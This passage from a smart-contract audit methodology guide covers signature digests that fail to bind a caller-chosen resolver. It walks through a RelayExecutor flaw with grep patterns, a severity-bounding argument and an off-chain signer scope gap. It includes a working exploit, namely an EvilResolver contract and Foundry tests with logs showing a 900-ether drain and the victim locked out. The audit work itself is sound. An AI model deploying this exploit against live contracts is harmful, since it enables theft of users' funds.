that decides what actually moves*. That gap is a permissionless MEV/theft primitive, and it is
almost always documented in a comment the authors wrote to reassure themselves.

### 16a. The shape, and the comment that gives it away

```solidity
// RelayExecutor.sol:130-137  ← the authors' own words
/// @dev Withdraw amount is the post-call Hub balance [...] The solver-selected
///      `callResolver` and `callResolverData` are not direct fields in the EIP-712
///      request, so a generic execution plan can be refreshed after authorization.

// RelayExecutor.sol:144-150
function execute(
    ExecuteAndWithdrawRequest calldata request,
    address callResolver,          // ← caller-supplied, NOT in digest
    bytes calldata callResolverData, // ← caller-supplied, NOT in digest
    address oracle,
    bytes calldata signature
) external nonReentrant {
    _validateRequest(request, oracle, signature);   // :151  resolver not passed → not bound
    _pullOrderFunds(request.orderAddress);          // :157  pulls the order's FULL balance
    ...
    _runCalls(callResolver, callResolverData, ...); // :168  funds that resolver, then calls it
    usedRequests[digest] = true;                    // :201-206
}
```

`_runCalls` (`:276-288`) transfers the **entire** `netInput` to `callResolver` and *then* calls
`ICallResolver(callResolver).execute(...)`. So the sequence is: signature validates the amount →
executor hands the whole balance to an attacker-named contract → attacker-named code decides where
it goes.

**Grep for the comment, not the bug.** Authors who leave a trust decision undocumented leave no
trace; authors who *know* they made one write a docstring explaining why it is fine. That docstring
is the highest-signal grep in a digest audit:

```bash
grep -rn "not direct fields in the EIP-712\|not part of the.*digest\|refreshed after authorization\|"
         "caller-supplied logic\|does not inherit.*privileges" --include=*.sol contracts/
```

On this target that grep returned three separate admissions, and each became a rung of the ladder
below.

### 16b. The three-rung ladder that turns "unbound" into a proven theft

Do not stop at "the digest doesn't include the resolver" — that is a code read. Prove each rung:

```
RUNG A  hashX(request) has no resolver parameter at all        -> digest identical for any resolver
RUNG B  same request+sig, attacker's resolver                 -> funded value lands in attacker's hands
RUNG C  the same request is now unusable by the legitimate solver -> usedRequests[digest] = true
```

Rung C is what upgrades this from "griefing" to "theft": the attacker's tx *consumes* the
single-use digest, so the honest solver's transaction reverts. The victim does not merely fail to be
served — they are locked out after their input has been spent.

```solidity
// RUNG A — the digest is resolver-agnostic by construction
bytes32 d = executor.hashExecuteAndWithdrawRequest(req);
// the hash function's signature takes only `req`; there is no address parameter to pass.
emit log_named_bytes32("digest (resolver-agnostic)", d);
```

```solidity
// RUNG B — evil resolver named by the caller, signature untouched
vm.prank(thief);
executor.execute(req, address(evilResolver), "", oracle, sig);
assertEq(hub.balanceOf(thief, IN_TOKEN), 900 ether, "attacker resolver took the funded input");
assertEq(hub.balanceOf(orderAddress, IN_TOKEN), 0, "order drained");
```

```
[PASS] test_R10_a_digestIsResolverAgnostic()
  digest: 0x5e46cde0d00aa8b001f82ee623d4006ea9f942ab627805e7af85f4b2315726d6
[PASS] test_R10_b_attackerResolverStealsFundedInput()
  thief balance  : 900000000000000000000
  order balance  : 0
[PASS] test_R10_c_victimIsLockedOutAfterFrontRun()
  PROVEN: same request+sig unusable after the front-run
```

The evil resolver is ~10 lines and needs no privileges:

```solidity
contract EvilResolver is ICallResolver {
  RelayHub immutable HUB; address immutable thief;
  function execute(ExecuteAndWithdrawRequest calldata req, bool, bytes calldata) external {
    uint256 id = Utils.generateTokenId(req.inChainId, req.inCurrency);
    uint256 bal = HUB.balanceOf(address(this), id);
    if (bal != 0) HUB.transfer(thief, id, bal);
  }
}
```

**Why this outranks the unguarded-resolver finding** (`unguarded-value-sweeping-entrypoints.md`):
that one needs the resolver to already hold a balance (transient per-order, balance `0` in
practice → UNPROVEN at execution). This one needs **nothing** from the resolver — the attacker
brings their own contract, and the executor cheerfully funds it. Same class, no reachability gap.

### 16c. THE SIGNED-MINIMUM BOUND THEOREM — this is what decides severity

The instinct is to call the above "total loss". It is not, and getting this wrong is the fastest way
to lose credibility on a real bug. Write the theorem down and test all three cases:

> **Loss = `netInput − outAmountMinimum`.** The signed minimum protects the *receiver*; it bounds
> nothing about the *input*. Every attack in this family (resolver swap, surplus skim, resolver
> retains input) converges on the same quantity, because `_finalizeWithdraw` checks only
> `balanceOf(executor, tokenOut) >= request.outAmountMinimum`.

Prove the bound, don't assert it — three tests, and the middle one is the finding:

```
[PASS] test_R11_a_honestRouteLeavesNothingToSkim()
  attacker skimmed (honest route): 0
[PASS] test_R11_b_lossEqualsSlippage()
  minOut           : 95000000000000000000
  attacker skimmed : 5000000000000000000     ← exactly netInput − minOut
[PASS] test_R11_c_zeroSlippageMeansZeroLoss()
  attacker skimmed (0 slippage): 0
```

Consequences for the report, all of which must be stated:

1. **A route that consumes 100% of the input leaves nothing to steal.** If the attacker routes
   through an honest 1:1 AMM that pulls all input, Rung B's assertion fails — the input is gone.
   The theft requires the attacker to *not* consume it (empty `calls[]`, pay the minimum out of
   their own inventory) or to consume only `outAmountMinimum` worth.
2. **Tight slippage = no loss.** `outAmountMinimum == netInput` ⇒ loss `0`. Orders with loose
   slippage (thin/volatile pairs) lose up to ~99%.
3. So the honest severity sentence is: *"Loss equals the order's slippage tolerance, not its
   notional. This is a real authorization-scope bug — the signed request does not bind the execution
   plan — with impact proportional to user-specified slippage."* Never "attacker steals 100%".

### 16d. Cross-layer: the same omission appears in the off-chain signer

The on-chain half is the resolver. The off-chain half is whatever else the signing service accepts
from the request body and forwards into the digest it signs. On this target that was `depository`:

```ts
// src/common/signature-verification.ts:67-79   the OWNER's signed payload
const createSignaturePayload = (operation, data) => ({
  operation, chainId, currency, amount, ownerChainId, owner, recipient, nonce,
  additionalData: data.additionalData,        // ← no `depository`
});

// src/api/.../withdraw-request-authorization/v1.ts:165-177   what the ORACLE signs
normalizedWithdrawRequest = normalizeWithdrawRequest({
  ...,
  depository: req.body.depository ?? chain.depository!,   // ← attacker-chosen, after verification
});
```

So one owner signature yields oracle signatures over *any* `depository`, while `RelayAllocator`
does bind `depository` into its digest (`:365-385`) — a pure scope gap between signer and executor.

**Two rules before ranking it:**
- **Prove the signer is reachable.** Local-instance proof is fine and necessary (HTTP `200` with
  different oracle signatures for different depositories), but state whether production edge-gates
  it.
- **Then census whether the freedom has a target.** Cross-depository replay is only a drain if a
  second depository exists for the same chain. Count it from the registry events — this is the step
  that demoted the finding from HIGH to latent:

```python
# count PayloadBuilderSet events per chainId, then count chainIds with >1 depository
# → total 152 events, 96 chainIds, 0 with more than one depository
```

Zero multi-depository chain ids ⇒ the signature is *forgeable for a value that reverts
`NoPayloadBuilder` on execution* ⇒ **MEDIUM latent**, with the enabling condition named. Reporting
it as HIGH drain would have been fabricating impact from a real bug.

### 16e. The generalised hunting question

> **For every function that (a) validates a signature and (b) acts on behalf of a caller-supplied
> *address or blob of code*, ask whether that address/blob is inside the digest. If the signature
> binds the amount but not the executor of the amount, the signature authorizes a number, not an
> action.**

One grep family covers the whole surface:

```bash
grep -rn "address .*Resolver\|address .*Receiver\|address .*Adapter\|address .*Target\|address .*Implementation" \
     --include=*.sol contracts/ | grep -v "immutable\|constant\|storage"
# each hit → is this parameter in the *_TYPEHASH string or the abi.encode of the digest? diff them.
```

And the severity ceiling is always the same: **find the one hard check that remains** (usually a
signed minimum output, a cap, or a rate limiter) and express loss as a function of it. On this
target it was `outAmountMinimum`; on the funding-pool sibling it was `perOrderCap`. There is always
exactly one such check, and the report's credibility rests on naming it rather than around it.
